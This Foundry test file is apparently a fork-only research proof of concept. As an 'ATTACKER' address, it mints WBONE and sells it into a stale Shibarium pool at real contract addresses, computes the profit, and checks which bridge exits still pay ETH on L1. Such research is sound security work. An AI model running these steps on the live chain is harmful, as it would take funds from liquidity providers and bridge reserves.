// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/* =====================================================================================
   ZH4-03 — Shibarium stale-WBONE cluster (read-only research; fork-only PoC).

   Findings proven here:
     1. WBONE.deposit() mints WBONE 1:1 from native BONE and withdraw() unwraps 1:1.
     2. The WBONE/WETH pool 0xe4db... is a Solidly volatile vAMM (factory fee 20 bps)
        whose last swap was 2026-07-04; its reserves still price WBONE at ~1.83x the
        market BONE price.  Selling freshly-minted WBONE into it yields ~1.193 WETH
        for ~38,084 BONE -> ~$747 gross at 2026-10-18 prices.
     3. The WETH child token's withdraw() burns on L2 (withdrawal initiation).
     4. The chained WBONE->WETH->DAI route is ~$937 nominal, but DAI is NOT exitable:
        the L1 ERC20Predicate's only MANAGER_ROLE holder is the team EOA, the
        RootChainManager role was revoked 2025-09-12, and the predicate escrows only
        ~37.84 DAI / ~0.90 USDT against 6,535 DAI / 12,779 USDT of L2 supply.
     5. The WETH->ETH exit is live: the EtherPredicate still has the RootChainManager
        as MANAGER_ROLE and pays ETH to the burn withdrawer.  The predicate holds
        ~1.94 ETH; the PoC's 1.1931 ETH payout fits.
   ===================================================================================== */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
}

interface IWBONE is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IChildERC20 is IERC20 {
    function withdraw(uint256) external;
}

interface IPair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function getAmountOut(uint256, address) external view returns (uint256);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IAccessControl {
    function hasRole(bytes32, address) external view returns (bool);
    function getRoleMemberCount(bytes32) external view returns (uint256);
    function getRoleMember(bytes32, uint256) external view returns (address);
    function MANAGER_ROLE() external view returns (bytes32);
}

interface IRCM {
    function rootToChildToken(address) external view returns (address);
    function childToRootToken(address) external view returns (address);
    function tokenToType(address) external view returns (bytes32);
    function typeToPredicate(bytes32) external view returns (address);
}

interface IPredicate {
    function exitTokens(address sender, address rootToken, bytes calldata logRLPList) external;
}

contract ShibariumWbone is Test {
    // ---- Shibarium (chain 109), block 19,475,745 snapshot -------------------------
    address constant WBONE          = 0x839FdB6cc98342B428E074C1573ADF6D48CA3bFd;
    address constant WETH           = 0x8ed7d143Ef452316Ab1123d28Ab302dC3b80d3ce;
    address constant DAI            = 0x0726959d22361B79e4D50A5D157b044A83eC870d;
    address constant USDT           = 0xaB082b8ad96c7f47ED70ED971Ce2116469954cFB;
    address constant POOL_WBONE_WETH = 0xe4dbeE5Fa46fB8A4D00FB719deDCAEDc91AE5F13;
    address constant POOL_DAI_WETH   = 0xD7115c435eB221addbD3A1D15c95491ec0545f7f;
    address constant POOL_WBONE_USDT = 0x4fC0DB98A912829b803D2fCFb40C12d5E9aFAe2c;
    address constant FACTORY        = 0xB9fbdFA27B7ba8BB2d4bB4aB399e4c55F0F7F83a;

    // ---- Ethereum L1, canonical Shibarium PoS bridge -----------------------------
    address constant RCM            = 0x08C4b60fda8aA6239b7de7d165BCF6F1686Cad82;
    address constant ERC20_PRED     = 0x6Aca26bFCE7675FF71C734BF26C8c0aC4039A4Fa;
    address constant ETHER_PRED     = 0xc3897302aB4B42931cB4857050Fa60f53B775870;
    address constant L1_DAI         = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant L1_USDT        = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_PSEUDO     = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address constant PRED_MANAGER_EOA = 0x80Cc222EA02F4334F67e9E55E7412fed62599004;

    // ---- DefiLlama spot, 2026-10-18 (18-decimal fixed point) ---------------------
    uint256 constant BONE_USD = 0.055485081029811666e18;
    uint256 constant WETH_USD = 2397.0888049932823e18;
    uint256 constant DAI_USD  = 1.0001987440469822e18;
    uint256 constant USDT_USD = 0.9991150832671013e18;

    bytes32 constant TRANSFER_SIG = 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;

    address constant ATTACKER = address(0xA11CE);
    address constant PAYEE    = address(0xB0B);

    receive() external payable {}

    // -----------------------------------------------------------------------------
    function _shibRpc() internal view returns (string memory) {
        return vm.envOr("SHIBARIUM_RPC_URL", string("https://rpc.shibarium.shib.io"));
    }

    function _l1Rpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }

    function _uniV2AmountOut(address pair, address tokenIn, uint256 amountIn)
        internal
        view
        returns (uint256)
    {
        (uint112 r0, uint112 r1,) = IPair(pair).getReserves();
        address t0 = IPair(pair).token0();
        (uint256 rIn, uint256 rOut) = tokenIn == t0
            ? (uint256(r0), uint256(r1))
            : (uint256(r1), uint256(r0));
        uint256 inFee = amountIn * 997;
        return (inFee * rOut) / (rIn * 1000 + inFee);
    }

    /* ============================ 1. WBONE 1:1 wrap ============================= */
    function test_wbone_deposit_withdraw_1to1() public {
        vm.createSelectFork(_shibRpc());
        console2.log("Shibarium fork block", block.number);

        uint256 before = IERC20(WBONE).balanceOf(address(this));
        IWBONE(WBONE).deposit{value: 1e18}();
        assertEq(IERC20(WBONE).balanceOf(address(this)), before + 1e18);
        console2.log("deposit 1 BONE -> WBONE delta", IERC20(WBONE).balanceOf(address(this)) - before);

        IWBONE(WBONE).withdraw(1e18);
        assertEq(IERC20(WBONE).balanceOf(address(this)), before);
    }

    /* ================= 2. WBONE/WETH stale-pool arb + WETH burn ================= */
    function test_wbone_weth_arb_and_weth_burn() public {
        vm.createSelectFork(_shibRpc());
        uint256 forkBlock = block.number;
        console2.log("Shibarium fork block", forkBlock);

        uint256 boneIn = 38_084.090645e18; // optimum at the 19,475,745 reserves, 20 bps fee
        vm.deal(ATTACKER, boneIn);
        vm.prank(ATTACKER);
        IWBONE(WBONE).deposit{value: boneIn}();
        assertEq(IERC20(WBONE).balanceOf(ATTACKER), boneIn);

        uint256 out = IPair(POOL_WBONE_WETH).getAmountOut(boneIn, WBONE);
        vm.prank(ATTACKER);
        IERC20(WBONE).transfer(POOL_WBONE_WETH, boneIn);
        vm.prank(ATTACKER);
        IPair(POOL_WBONE_WETH).swap(0, out, ATTACKER, "");

        uint256 wethOut = IERC20(WETH).balanceOf(ATTACKER);
        assertEq(wethOut, out);

        uint256 costUsd  = boneIn * BONE_USD / 1e18;
        uint256 valueUsd = wethOut * WETH_USD / 1e18;
        uint256 grossUsd = valueUsd - costUsd;

        console2.log("boneIn (wei)", boneIn);
        console2.log("wethOut (wei)", wethOut);
        console2.log("cost USD e18", costUsd);
        console2.log("value USD e18", valueUsd);
        console2.log("gross profit USD e18", grossUsd);
        assertGt(grossUsd, 700e18);

        // L2 withdrawal initiation: ChildERC20.withdraw burns 1:1 (no fee, no ETH sent on L2)
        uint256 supplyBefore = IERC20(WETH).totalSupply();
        vm.prank(ATTACKER);
        IChildERC20(WETH).withdraw(wethOut);
        assertEq(IERC20(WETH).balanceOf(ATTACKER), 0);
        assertEq(IERC20(WETH).totalSupply(), supplyBefore - wethOut);
        console2.log("WETH burned on L2 (withdrawal initiated)", wethOut);
    }

    /* ================= 3. chained WBONE->WETH->DAI (NOMINAL only) =============== */
    function test_chained_wbone_weth_dai_nominal() public {
        vm.createSelectFork(_shibRpc());
        console2.log("Shibarium fork block", block.number);

        uint256 boneIn = 15_718e18; // joint optimum at the 19,475,745 reserves
        vm.deal(ATTACKER, boneIn);
        vm.prank(ATTACKER);
        IWBONE(WBONE).deposit{value: boneIn}();

        uint256 wethMid = IPair(POOL_WBONE_WETH).getAmountOut(boneIn, WBONE);
        vm.prank(ATTACKER);
        IERC20(WBONE).transfer(POOL_WBONE_WETH, boneIn);
        vm.prank(ATTACKER);
        IPair(POOL_WBONE_WETH).swap(0, wethMid, ATTACKER, "");

        uint256 daiOut = _uniV2AmountOut(POOL_DAI_WETH, WETH, wethMid);
        vm.prank(ATTACKER);
        IERC20(WETH).transfer(POOL_DAI_WETH, wethMid);
        vm.prank(ATTACKER);
        IPair(POOL_DAI_WETH).swap(daiOut, 0, ATTACKER, "");

        uint256 daiBal = IERC20(DAI).balanceOf(ATTACKER);
        assertEq(daiBal, daiOut);

        uint256 costUsd  = boneIn * BONE_USD / 1e18;
        uint256 valueUsd = daiOut * DAI_USD / 1e18;
        uint256 nominalUsd = valueUsd - costUsd;
        console2.log("boneIn (wei)", boneIn);
        console2.log("wethMid (wei)", wethMid);
        console2.log("daiOut (wei)", daiOut);
        console2.log("nominal profit USD e18", nominalUsd);
        assertGt(nominalUsd, 900e18);

        // The L2 DAI burn succeeds, but the L1 release is frozen (see L1 test below).
        vm.prank(ATTACKER);
        IChildERC20(DAI).withdraw(daiBal);
        assertEq(IERC20(DAI).balanceOf(ATTACKER), 0);
        console2.log("DAI burned on L2 (L1 exit frozen)", daiBal);
    }

    /* ================= 4. WBONE/USDT (NOMINAL only) ============================= */
    function test_wbone_usdt_nominal() public {
        vm.createSelectFork(_shibRpc());
        console2.log("Shibarium fork block", block.number);

        uint256 boneIn = 1_196.754658e18;
        vm.deal(ATTACKER, boneIn);
        vm.prank(ATTACKER);
        IWBONE(WBONE).deposit{value: boneIn}();

        uint256 usdtOut = IPair(POOL_WBONE_USDT).getAmountOut(boneIn, WBONE);
        vm.prank(ATTACKER);
        IERC20(WBONE).transfer(POOL_WBONE_USDT, boneIn);
        vm.prank(ATTACKER);
        IPair(POOL_WBONE_USDT).swap(0, usdtOut, ATTACKER, "");

        uint256 usdtBal = IERC20(USDT).balanceOf(ATTACKER);
        assertEq(usdtBal, usdtOut);

        uint256 costUsd  = boneIn * BONE_USD / 1e18;
        uint256 valueUsd = usdtOut * USDT_USD / 1e6; // USDT has 6 decimals
        uint256 nominalUsd = valueUsd - costUsd;
        console2.log("boneIn (wei)", boneIn);
        console2.log("usdtOut (raw 6d)", usdtOut);
        console2.log("nominal profit USD e18", nominalUsd);
        assertGt(nominalUsd, 50e18);

        vm.prank(ATTACKER);
        IChildERC20(USDT).withdraw(usdtBal);
        assertEq(IERC20(USDT).balanceOf(ATTACKER), 0);
        console2.log("USDT burned on L2 (L1 exit frozen)", usdtBal);
    }

    /* ================= 5. L1 exit gates (the decisive check) =================== */
    function test_l1_exit_gates() public {
        vm.createSelectFork(_l1Rpc());
        console2.log("Ethereum fork block", block.number);

        bytes32 mr = IAccessControl(ERC20_PRED).MANAGER_ROLE();

        // ERC20 path (DAI/USDT) is manager-frozen: one member, the team EOA; RCM revoked.
        assertEq(IAccessControl(ERC20_PRED).getRoleMemberCount(mr), 1);
        assertEq(IAccessControl(ERC20_PRED).getRoleMember(mr, 0), PRED_MANAGER_EOA);
        assertFalse(IAccessControl(ERC20_PRED).hasRole(mr, RCM));

        // Ether path (WETH child) still has the RCM as manager.
        assertTrue(IAccessControl(ETHER_PRED).hasRole(mr, RCM));

        // Canonical mappings.
        assertEq(IRCM(RCM).rootToChildToken(L1_DAI), DAI);
        assertEq(IRCM(RCM).rootToChildToken(L1_USDT), USDT);
        assertEq(IRCM(RCM).rootToChildToken(ETH_PSEUDO), WETH);
        assertEq(IRCM(RCM).childToRootToken(WETH), ETH_PSEUDO);
        assertEq(IRCM(RCM).typeToPredicate(IRCM(RCM).tokenToType(L1_DAI)), ERC20_PRED);
        assertEq(IRCM(RCM).typeToPredicate(IRCM(RCM).tokenToType(ETH_PSEUDO)), ETHER_PRED);

        uint256 daiEscrow  = IERC20(L1_DAI).balanceOf(ERC20_PRED);
        uint256 usdtEscrow = IERC20(L1_USDT).balanceOf(ERC20_PRED);
        uint256 ethBuffer  = address(ETHER_PRED).balance;
        console2.log("ERC20Predicate DAI escrow", daiEscrow);
        console2.log("ERC20Predicate USDT escrow", usdtEscrow);
        console2.log("EtherPredicate ETH buffer", ethBuffer);

        assertLt(daiEscrow, 38e18);       // actual ~37.84 DAI
        assertLt(usdtEscrow, 1e6);        // actual ~0.904373 USDT
        assertGt(ethBuffer, 1.193132635970670183e18);
    }

    /* ================= 6. DAI exit reverts (frozen path) ======================= */
    function test_l1_erc20_exit_reverts() public {
        vm.createSelectFork(_l1Rpc());
        vm.expectRevert();
        vm.prank(RCM);
        IPredicate(ERC20_PRED).exitTokens(PAYEE, L1_DAI, "");
    }

    /* ================= 7. EtherPredicate pays ETH to the burn withdrawer ======= */
    function test_l1_ether_exit_payout() public {
        vm.createSelectFork(_l1Rpc());
        console2.log("Ethereum fork block", block.number);

        uint256 amount = 1.193132635970670183e18;
        bytes memory log = _rlpLog(WETH, PAYEE, amount);

        uint256 payeeBefore = PAYEE.balance;
        uint256 predBefore  = address(ETHER_PRED).balance;
        assertGt(predBefore, amount);

        vm.prank(RCM);
        IPredicate(ETHER_PRED).exitTokens(PAYEE, ETH_PSEUDO, log);

        assertEq(PAYEE.balance, payeeBefore + amount);
        assertEq(address(ETHER_PRED).balance, predBefore - amount);
        console2.log("ETH paid to withdrawer", amount);
        console2.log("EtherPredicate ETH left", address(ETHER_PRED).balance);
    }

    /* ---------------------------------------------------------------------------
       Minimal RLP encoding of a receipt log: [address, [topic0, from, to], data].
       The EtherPredicate parses exactly this; the RCM would have already checked
       the receipt/checkpoint proof before calling predicate.exitTokens.
       --------------------------------------------------------------------------- */
    function _rlpLog(address emitter, address from, uint256 amount) internal pure returns (bytes memory) {
        bytes memory topics = abi.encodePacked(
            bytes1(0xf8), bytes1(0x63),          // list, 99-byte payload
            bytes1(0xa0), TRANSFER_SIG,          // Transfer(address,address,uint256)
            bytes1(0xa0), bytes32(uint256(uint160(from))),
            bytes1(0xa0), bytes32(uint256(0))
        );
        bytes memory data = abi.encodePacked(bytes1(0xa0), bytes32(amount));
        bytes memory payload = abi.encodePacked(bytes1(0x94), emitter, topics, data);
        // 21 + 101 + 33 = 155 bytes -> 0xf8 0x9b
        return abi.encodePacked(bytes1(0xf8), bytes1(0x9b), payload);
    }
}
